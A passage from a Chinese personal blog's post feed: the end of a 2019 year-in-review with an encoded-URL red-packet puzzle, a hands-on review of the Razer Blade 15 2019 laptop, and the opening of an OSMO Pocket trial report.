target=\"_blank\">FHYunCai</a>\n</li>\n<li>八月：一个人去厦门武汉转了一圈，拍了自己的第一个 Vlog</li>\n<li>八月：入手了一个 Kindle Paperwhite 4，没有泡面可以压，于是用来看英文小说了</li>\n<li>八月：加入 TEDxNingbo 志愿者团队</li>\n<li>八月：和 Ralph 面基</li>\n<li>八月：入手了一个 Yubikey</li>\n<li>九月：人生第一次参加雅思考试 <del>7分，蛮开心的</del>\n</li>\n<li>十月：入手了一个 Samsung Galaxy Watch Active 2 <del>觉得不值</del>\n</li>\n<li>十一月：MDx 达到 400 Stars</li>\n<li>十一月：为 TEDxNingbo 设计开发的 H5 上线</li>\n<li>十一月：入手了第一台胶片相机，试图入坑胶片摄影</li>\n<li>十一月：参加 TEDxNingbo 2019 大会</li>\n<li>十二月：<del>我 Cytus II 入门了</del>\n</li>\n</ul>\n<h1>跨年红包</h1>\n<p>这算「传统习俗」了。和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2020年1月2日。</p>\n<p>今年的解谜旅程，从下面这个字符串开始。</p>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>由于今年的题目比以前稍微难了一些，所以今年的红包金额还是比较大的，而且不限量，尽你所能试一试吧。</p>\n<p>一点你可能用得上的提示：URL 里全是 ASCII 字符 / 24×3，横向读取。</p>\n<p><a href=\"https://flyhigher.top/develop/1519.html\">答案</a>已公布。</p>\n<h1>跨年海报</h1>\n<p>这算是另一个「传统习俗」（笑）。因为我有做跨年海报的习惯，所以以下就是今年份的海报啦。</p>\n<p>用了 C4D+PS，还有我的一整个下午。</p>\n<p>提前祝各位新年快乐！</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter wp-image-1467 size-large\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90#\" alt=\"\" width=\"724\" height=\"1024\"></a>\n","link":"https://flyhigher.top/diary/1464.html"},{"title":"Razer Blade 灵刃 15 2019 精英版简评","date":"2019-07-27 19:22:58","description":"\n<blockquote><p>“你这什么电脑啊，也是惠普的么？比我的还重一点欸。”同学拿着暗影精灵说。<br>\n“emmmm….杂牌电脑，买灯送的。”</p></blockquote>\n<h1>故事</h1>\n<p>考完高考，该换台电脑了。我此前在用的是一台 Dell Inspiron 15 7560，一台从商务本的角度来看还算不错的笔记本，平常用来写写代码还不错，但在我剪视频以及折腾 C4D 的时候明显有些力不从心，更别提运行大型游戏了。于是趁着这次换机机会，我打算换一台<strong>性能还算不错，又能带着走</strong>的笔记本。这么想着，我列出了我的需求：</p>\n<ul>\n<li>性能较高</li>\n<li>便携性好（薄、重量轻、电池续航长等）</li>\n<li>外观低调</li>\n<li>预算最高 2.5w</li>\n</ul>\n<p>由于并不喜欢外观太张扬的「游戏本风格」，我希望我选择的笔记本外观干净低调。此外，由于我最近正在折腾学习 ML，我希望显卡可以是 20 系的（虽然 10 系也不是不能用…）。满足以上需求的只有以下几种选择：</p>\n<ul>\n<li>技嘉 Aero 15</li>\n<li>Razer Blade 15 2019 精英版</li>\n<li>msi GS75</li>\n</ul>\n<p>至于败家之眼由于太过张扬，直接被我排除了。在仅剩的三个选择里面，Razer Blade 15 的外观在我看来是最低调简约的，而且屏幕有 1080P+240Hz 和 4K+触摸两种都很不错的规格可选，唯一的问题大概就是在 10 代 U 都快能买到的时候，Razer Blade 15 的 CPU 还是 8 代的。</p>\n<p>（哦…缺点大概还有比较贵吧…）</p>\n<p>在我纠结的时候，我联系的卖家告诉我 Razer Blade 9 代 U 的版本已经到国内总代了，如果顺利的话他可以在 6.16 第一批直接给我发货；另外他也可以为高考生提供优惠。既然都这样了还有什么好纠结的，买了！选了 2070 Max-Q/16GB/256GB/1080P/240Hz 的版本，下单付款，果然在 16 号顺利入手。</p>\n<p>最终确定这个配置是因为 2080 的版本太贵，但是 4K 触摸屏版本只在 2080 版本上有，只好选了 1080P；另外 512 GB 的版本比我买的 256 GB 贵了 2K，于是决定自己买块 1T 的盘换掉。</p>\n<h1>开箱</h1>\n<p>包装箱也很低调，只在侧面露出一抹骚绿。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg\" alt=\"\" width=\"2500\" height=\"1875\" class=\"aligncenter size-full wp-image-1398\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-1024x768.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>正面和背面。照片是在用了一个多月以后拍的，看起来有点脏。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg\" alt=\"\" width=\"2000\" height=\"1349\" class=\"aligncenter size-full wp-image-1394\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-300x202.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-768x518.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-1024x691.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg\" alt=\"\" width=\"2300\" height=\"1630\" class=\"aligncenter size-full wp-image-1386\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-300x213.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-768x544.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-1024x726.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>卸下后盖十颗梅花螺丝就能打开后盖。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg\" alt=\"\" width=\"2000\" height=\"2636\" class=\"aligncenter size-full wp-image-1399\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-228x300.jpg 228w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-768x1012.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-777x1024.jpg 777w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p>SSD、内存条和无线网卡都在触手可及的地方。这张图里我已经换好了 SSD。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg\" alt=\"\" width=\"2500\" height=\"1790\" class=\"aligncenter size-full wp-image-1400\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-300x215.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-768x550.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-1024x733.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>网卡是 AX200NGW，Intel 第一款支持 Wi-Fi 6 的网卡，好评。内存为双通道 DDR4，支持 XMP，不过我懒得折腾了。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg\" alt=\"\" width=\"2000\" height=\"1795\" class=\"aligncenter size-full wp-image-1401\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-300x269.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-768x689.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-1024x919.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p><strong>后盖只有一处卡扣，在靠近转轴一侧中间的位置，安装后盖的时候需要注意下。此外后盖和机身卡得比较紧，安装的时候需要注意下后盖有没有完全卡入机身。</strong></p>\n<p>然后开机。硬盘复制和升级系统什么的就不再赘述了。自带 Windows 10 家庭版，为了装 Docker 我升级到了专业版。</p>\n<p>从开箱到现在，我已经使用这台电脑一月有余。讲讲使用上的感受吧。</p>\n<h1>机身</h1>\n<p><strong>有人说 Blade 就是 Windows 版的 Macbook，这个说法其实还算贴切。</strong>整个金属材质的 A 面只有一个 Razer 的 Logo，屏幕点亮的时候会一同亮起。B 面是支持 Windows Hello 的摄像头、屏幕和一个比较低调的 Razer Logo。屏幕三面边框比较窄，观感不错。<strong>而一旦打开屏幕，Windows Hello 就会开始识别你的面部，并极快地解锁进入桌面，很舒服。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg\" alt=\"\" width=\"2000\" height=\"1500\" class=\"aligncenter size-full wp-image-1396\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-1024x768.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p><span>和 Windows Hello 说声 Hello？</span></p>\n<p><strong>B 面边缘有一圈非常细的胶圈，可以在屏幕闭合的时候起密封的作用（不过实测效果不大…）。</strong>C 面是键盘、扬声器、开机键和触控板，这些后面会细说。<strong>D 面是塑料材质，有两条蛮厚的橡胶条把机身垫高</strong>，猜测是为了散热。</p>\n<p>Razer Blade 15 的接口比较丰富。左侧：</p>\n<ul>\n<li>电源接口</li>\n<li>2 个 USB 3.2 Gen 2 Type-A 接口</li>\n<li>1 个 3.5 mm 组合音频插孔</li>\n</ul>\n<p>右侧：</p>\n<ul>\n<li>1 个 USB 3.2 Gen 2 Type-A 接口</li>\n<li>1 个雷电 3 接口（通过 GPU 输出）</li>\n<li>1 个 HDMI 2.0B 接口</li>\n<li>1 个 MiniDisplayPort 1.4 接口</li>\n<li>安全锁孔</li>\n</ul>\n<p>这些接口日常使用完全够用，通过雷电 3 也能获得不错的拓展性（不过雷电 3 似乎需要跟独显抢带宽…）。</p>\n<p><strong>机身边缘比较锐，不过出乎意料地不是非常割手。</strong>之前在用的 Dell Inspiron 15 7560 边缘极其锋利，非常割手，难受。现在（相对来说）打字舒服很多了，好评。</p>\n<p><strong>机身很薄，薄到有点出乎意料。</strong>官方数据只有 17.8mm，就算加上把机身垫高了的橡胶条也还是比一枚硬币矮。然而毕竟还是塞了这么多硬件进去，看起来轻薄但<strong>实际上一点都不轻</strong>，官方数据 2.07 kg，加上砖头一样的电源适配器，<strong>出趟门其实还是有点累的。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg\" alt=\"\" width=\"2300\" height=\"1136\" class=\"aligncenter size-full wp-image-1395\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-300x148.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-768x379.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-1024x506.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<h1>续航</h1>\n<p>出乎意料，<strong>续航还不错</strong>，达到了我的预期。电池达到了 80Wh，我日常一个 VSCode 写代码，一个 Chrome 查资料，<strong>续航可以达到 8 小时出头</strong>，就算是在玩 HITMAN 1 小时后，电量仍能剩余一半左右。也就是说，短时间的移动办公完全不是问题，可以不带上厚重的电源适配器，算是解决了一部分「重」的问题吧。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg\" alt=\"\" width=\"2500\" height=\"1860\" class=\"aligncenter size-full wp-image-1397\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-300x223.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-768x571.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-1024x762.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p><span>电源适配器有点大</span></p>\n<h1>屏幕</h1>\n<p><strong>爽！真的爽！240Hz 刷新率带来的是实打实的流畅感</strong>，和 90Hz 那种需要用一段时间才能感受到的流程感不同， 240Hz 带来的是在桌面上划划鼠标都能感受到的异常流畅的感觉。</p>\n<p>不过受限于这块 2070 Max-Q，很多游戏游戏都没能完全利用这块屏幕的性能，再加上我不玩 FPS 游戏，高刷新率对我来说意义不大，<strong>这块屏幕的 240Hz 对我来说噱头大于实际作用（但是没得选啊…）。</strong>屏幕为 IPS 面板，覆盖 100% sRGB，并有出厂校色。由于我手头没有校色设备，具体参数暂时无法测量，但就官方数据来看，这块屏幕的素质还是不错的。当然 4K 版本由于面向设计师等，屏幕参数会更好，可惜我是体验不到了。</p>\n<h1>键盘、触控板和扬声器</h1>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg\" alt=\"\" width=\"2300\" height=\"1619\" class=\"aligncenter size-full wp-image-1391\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-300x211.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-768x541.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-1024x721.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>打开屏幕第一反应：<strong>这触控板有点大啊。</strong>Rzaer Blade 15 配备的触控板比 Dell Inspiron 15 7560 大上一整圈，采用类玻璃材质，手感不错。触控板使用了微软 Precision 驱动，对 Windows 的各类手势支持良好。</p>\n<p><strong>键盘总的来说还行</strong>，键程不短，触感不算太软，为平面键帽；没有小键盘，不过方向键的大小与其他键一致。有一点要吐槽的就是键盘的按键标识是上下颠倒的…也就是需要配合 <kbd>Shift</kbd> 使用的键的标识反而在直接使用的键的标识的下方…虽然影响不大，但打字时看到键盘着实觉得违和。</p>\n<p>没有了小键盘，C 面多出来的空间被留给了扬声器。<strong>而这个声音…比较一般</strong>，整体听感有些薄而含混。不过好歹是 C 面朝上的双扬声器，声音还算清楚，而且立体声的感觉较强。加上自带的 Dolby Atmos 加成，<strong>总体听感还算可以。</strong></p>\n<p>另外，开机键被藏在了右侧扬声器上方，没有灯，有些低调。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg\" alt=\"\" width=\"2300\" height=\"2264\" class=\"aligncenter size-full wp-image-1392\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-300x295.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-768x756.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-1024x1008.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<h1>系统</h1>\n<p>出厂带有 Windows 10 家庭版，预装雷蛇雷云。在雷云内不仅可以调整这台电脑的灯光、性能等设置，还可以一并调整所有连接到这台电脑的雷蛇外设的设置。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg\" alt=\"\" width=\"1280\" height=\"719\" class=\"aligncenter size-full wp-image-1387\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg 1280w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-768x431.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-1024x575.jpg 1024w\" sizes=\"(max-width: 1280px) 100vw, 1280px\"></a>\n<p><span>雷云 3 主界面</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg\" alt=\"\" width=\"1280\" height=\"719\" class=\"aligncenter size-full wp-image-1390\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg 1280w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-768x431.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-1024x575.jpg 1024w\" sizes=\"(max-width: 1280px) 100vw, 1280px\"></a>\n<p><span>灯光拥有丰富的自定义选项（灯厂无疑了）</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg\" alt=\"\" width=\"434\" height=\"262\" class=\"aligncenter size-full wp-image-1389\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg 434w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3-300x181.jpg 300w\" sizes=\"(max-width: 434px) 100vw, 434px\"></a>\n<p><span>可以调整屏幕刷新率</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg\" alt=\"\" width=\"2500\" height=\"1875\" class=\"aligncenter size-full wp-image-1393\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-1024x768.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p><span>通过 Chroma 可以在支持的软件内使键盘背光与软件内容同步</span></p>\n<p><strong>不过由于雷蛇的服务器在大陆一向不稳定，雷云在实际体验上真的是…一言难尽。</strong>有时候会莫名开机不自启、主面板无限加载、灯光配置无法应用…心累。</p>\n<p>此外，显卡驱动似乎也不太稳定（这大概是英伟达的锅？）。偶尔屏幕会突然黑掉，需要合盖再开盖才能再次唤醒屏幕；甚至有一次我遇到了 10 分钟内连续两次蓝屏…至少从错误代码来看问题出在显卡驱动。不过这些问题遇到的几率也不大，一个月内绝大部分时间它还是正常工作的，显卡驱动也没有在我游戏的时候崩掉过。还算能用吧。</p>\n<h1>性能</h1>\n<p>作为妥妥的游戏本，Razer Blade 15 配备了 i7-9750H，RTX2070 Max-Q，16 GB 内存，<strong>性能自然是不差的，基本达到了这一水平笔记本的一般水准。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg\" alt=\"\" width=\"702\" height=\"400\" class=\"aligncenter size-full wp-image-1410\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg 702w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19-300x171.jpg 300w\" sizes=\"(max-width: 702px) 100vw, 702px\"></a>\n<p><span>CPU-Z 和 GPU-Z</span></p>\n<p>i7-9750H 默频 2.60GHz，睿频可达 4GHz 左右，<strong>然而只是 30 秒真男人。</strong>25度室温、高性能模式下 30 秒左右的满负载就会让这块 CPU 撞墙，频率会掉到 3GHz 出头并稳定在此，<strong>而平衡模式则更快。</strong></p>\n<p>Razer Blade 15 配备的是一块 Max-Q 版本的 RTX2070，<strong>而且是较低功耗 80W 的版本</strong>，猜测是为了散热考虑（毕竟这么薄了）。风扇全开散热时风扇声音较响，但仍能忍受；而且日常工作使用一般不会使风扇转起来，<strong>因此噪音控制还算不错。</strong></p>\n<p>由于是这篇算是简评，并没有详测游戏，直接上跑分吧。室温 25 度， 平衡模式下 Cinebench R20 分数 1927，有些偏低；而使用高性能模式时分数直接飙到 2424 分，看来平衡模式功耗墙砍得比较狠。（顺便提一句，雷蛇甚至提供了功耗更低的性能方案，没有什么测试的必要就不测了。）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg\" alt=\"\" width=\"753\" height=\"637\" class=\"aligncenter size-full wp-image-1405\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg 753w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17-300x254.jpg 300w\" sizes=\"(max-width: 753px) 100vw, 753px\"></a>\n<p>在 3DMark Time Spy 测试下平衡模式 6283 分，高性能模式 6872 分，相比有一点的提升。只能说压得够狠。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg\" alt=\"\" width=\"1920\" height=\"954\" class=\"aligncenter size-full wp-image-1406\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-300x149.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-768x382.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-1024x509.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p><span>平衡模式</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg\" alt=\"\" width=\"1920\" height=\"957\" class=\"aligncenter size-full wp-image-1408\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-300x150.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-768x383.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-1024x510.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p><span>高性能模式</span></p>\n<p>至于这 16GB 的内存…至少我是完全够用，要升级的话也可以自行更换到最高 64GB。</p>\n<h1>总结</h1>\n<p>这已经不是雷蛇第一年做笔记本了。总的来看，雷蛇似乎已经有些摸清了门道。今年年中推出的配备 9 代 Intel CPU 的灵刃系列几乎可以说是在各个方面都做到了尽可能完美。当然问题也有一些，相信雷蛇可以在后续解决。总结一下我手头的这台笔记本吧。</p>\n<p>优点：</p>\n<ul>\n<li>高性能的同时有较长续航</li>\n<li>优秀的屏幕</li>\n<li>干净的外观设计</li>\n<li>薄而坚固的机身</li>\n<li>较丰富的 IO</li>\n<li>细节到位（Wi-Fi 6、Windows Hello 等等）</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>价格稍高</li>\n<li>驱动、软件等有些不稳定</li>\n<li>为了散热有一定的性能损失</li>\n<li>机身偏重</li>\n</ul>\n<p>当我正准备结束这篇简评的时候正好收到了雷蛇雷云驱动更新，其中包含了我这一型号的「问题修复与改进」。待会儿就去更新，看看雷蛇有没有解决一部分问题吧。</p>\n<p>最后加一句，本文所有图片都是由一加 7 Pro 拍摄的，也就这样吧…</p>\n","link":"https://flyhigher.top/diary/1411.html"},{"title":"OSMO Pocket 一日试用报告","date":"2019-02-02 09:38:38","description":"\n<p>计划寒假出门练练延时视频的拍摄，碰巧得知老师买了一个 <a href=\"https://www.dji.com/osmo-pocket\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">OSMO Pocket</a>，正好我对这玩意儿有点兴趣，就向老师借了一天玩了玩，带着它在城市里跑了一圈，这篇文章算是试用后的总结报告。不过这毕竟只是一天快速试用之后的总结，如果有不正确或是不完善的地方还请见谅。</p>\n<p><strong>TL;DR:</strong> 这款产品目前应该只适用于重度 Vlog 拍摄者，相对其他拍摄方案有一些优势，但也有很多不足。对我来说，我本来没有太强烈的购买 OSMO Pocket 的欲望，试用过后依然没有太大的购买欲望。<strong>请谨慎考虑购买。</strong></p>\n<p>（如果出二代我可能会买吧…（小声）</p>\n<blockquote><p>这篇文章中所有图片和视频<strong>都经过二次压缩以缩短在网页上的加载时间，不代表 OSMO Pocket 的真实拍摄水平</strong>（当然所有评测都基于未压缩的原始图像），如果需要原始图像可以直接联系我。另外，本文中的多数照片/视频都是“为评测而拍”，没有刻意追求美感，虽然观感不一定好，但这不代表 OSMO Pocket 就拍不出好看的照片/视频——<strong>毕竟“人”才是一张照片是否“美”的决定因素。</strong></p></blockquote>\n<h1>初印象</h1>\n<p><strong>到手的第一印象：好小啊。</strong>虽然对 OSMO Pocket 已经提前有所了解，但刚刚接触它时仍惊讶于它的体积。就算有一层保护壳， OSMO Pocket 还是可以被轻松地放进口袋里，相对于手机+稳定器的方案，OSMO Pocket 便携多了，好评。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg\" alt=\"\" width=\"1867\" height=\"2500\" class=\"aligncenter size-full wp-image-1313\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg 1867w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-224x300.jpg 224w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-768x1028.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-765x1024.jpg 765w\" sizes=\"(max-width: 1867px) 100vw, 1867px\"></a>\n<p><strong>完全启动的速度挺快</strong>，不过屏幕不大。屏幕支持触摸，而机身上的实体按键只有两个。简单试用了下，在屏幕上的操作主要以滑动为主，操作逻辑还算清晰，不过这个触屏对于点击的灵敏度真的挺低的，经常出现点击却没有反应的情况 。两个实体按键之一就是拍摄键，熟悉了之后操作效率还是很高的。好评。</p>\n<p>不过由于屏幕小，实际情况下很多操作无法在屏幕上完成，<strong>因此连接手机后的 OSMO Pocket 才算得上是完整体。</strong>其与手机的连接通过物理连接（连接头）实现（不过可以通过配件实现无线连接）。</p>\n<p>我拿到 OSMO Pocket 时它已经被使用了一段时间了，手机连接头已经插在机身上了。虽然这个连接头可以卸下并反装（以保护连接头）或者换上接口保护板，但是实际操作中要卸下连接头非常麻烦，所以一般情况下为了方便使用，连接头只能以这种有点难看的姿势插在机身上。DJI 甚至考虑到了这个问题，在保护壳的绑带上切了个口子，方便连接头伸出…</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg\" alt=\"\" width=\"2000\" height=\"2279\" class=\"aligncenter size-full wp-image-1314\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-263x300.jpg 263w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-768x875.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-899x1024.jpg 899w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p>奇葩的保护壳</p>\n<p>机身底部是一个 USB Type-C 接口，用来充电，好评。不过没有标准螺口，没法直接固定在三脚架上，需要购买额外配件，很难受。</p>\n<p>此外使用时需要从机身侧面插入一张 SD 卡用于存储拍摄内容，通过配套的 DJI Mimo APP 可以将拍摄的内容传输到手机上。DJI Mimo 同时可以在 OSMO Pocket 连接到手机后作为拍摄控制器使用。</p>\n<p>第一眼看上去，OSMO Pocket 